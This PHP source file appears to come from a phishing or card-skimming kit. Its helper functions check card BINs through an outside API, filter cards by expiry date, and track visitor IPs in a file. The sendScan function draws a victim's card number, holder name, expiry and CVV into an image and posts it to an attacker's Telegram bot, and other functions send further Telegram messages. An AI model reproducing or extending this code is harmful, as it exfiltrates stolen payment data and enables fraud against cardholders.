<?php

function binChecker($bin) {
    $api_url = "https://data.handyapi.com/bin/{$bin}";
    $response = file_get_contents($api_url);
    $result = json_decode($response, true);
    $_SESSION['type'] = $result['Type'];
    $_SESSION['level'] = $result['CardTier'];
    $_SESSION['bank'] = $result['Issuer'];
    $_SESSION['country'] = $result['Country']['Name'];
    $_SESSION['luhn'] = $result['Luhn'];
}

function sendMessage($chat_id, $text, $buttons = null, $replyToId = null) {
    global $telegram;

    $urlParams = array(
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    );

    if ($buttons !== null) {
        $urlParams['reply_markup'] = json_encode($buttons);
    }

    if ($replyToId !== null) {
        $urlParams['reply_to_message_id'] = $replyToId;
    }
    
     $apiUrl = "https://api.telegram.org/bot{$telegram['token']}/sendMessage?" . http_build_query($urlParams);
     $ch = curl_init($apiUrl);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     $response = curl_exec($ch);
     curl_close($ch);
     $response = json_decode($response, true);
}

function writeOnFile($file, $ip) {
    $content = file_get_contents($file);
    if (strpos($content, $ip) !== false) {
        return;
    }
    
    file_put_contents($file, $ip . PHP_EOL, FILE_APPEND);
}

function removeIPFromFile($file, $ip) {
    $content = file_get_contents($file);
    
    if (strpos($content, $ip) !== false) {
        $content = str_replace($ip . PHP_EOL, '', $content);
        
        file_put_contents($file, $content);
    }
}

function isDateExpired($expiryDate) {
    list($month, $year) = explode('/', $expiryDate);
    
    $month = intval($month);
    $year = intval($year);

    $targetMonth = 6;
    $targetYear = 24;

    if ($year < $targetYear) {
        return true;
    } elseif ($year === $targetYear && $month < $targetMonth) {
        return true;
    } else {
        return false;
    }
}

function sendScan($chat_id, $holder, $number, $exp, $cvv) {
    global $telegram;

    $image = imagecreatetruecolor(400, 200);
    $bgColor = imagecolorallocate($image, 255, 255, 255); 
    $textColor = imagecolorallocate($image, 0, 0, 0);
    imagefilledrectangle($image, 0, 0, 399, 199, $bgColor);
    $textSize = 5;
    $margin = 10;
    imagestring($image, $textSize, $margin, 30, $number, $textColor);
    imagestring($image, $textSize, $margin, 70, $holder, $textColor);
    imagestring($image, $textSize, $margin, 110, $exp, $textColor);
    imagestring($image, $textSize, $margin, 150, $cvv, $textColor);
    $tempImagePath = 'image.png';
    imagepng($image, $tempImagePath);
    imagedestroy($image);
    $telegramApiUrl = "https://api.telegram.org/bot{$telegram['token']}/sendPhoto";
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chat_id,
        'photo' => new CURLFile($tempImagePath),
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    unlink($tempImagePath);
}

function sendTelegramMessage($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatId}&text=" . urlencode($message);
    file_get_contents($url);
}

function getStreamContext($token) {
    $options = array(
        'http' => array(
            'method' => 'GET',
            'header' => "Authorization: $token\r\n" .
                        "Origin: https://{$_SERVER['HTTP_HOST']}\r\n"
        )
    );
    return stream_context_create($options);
}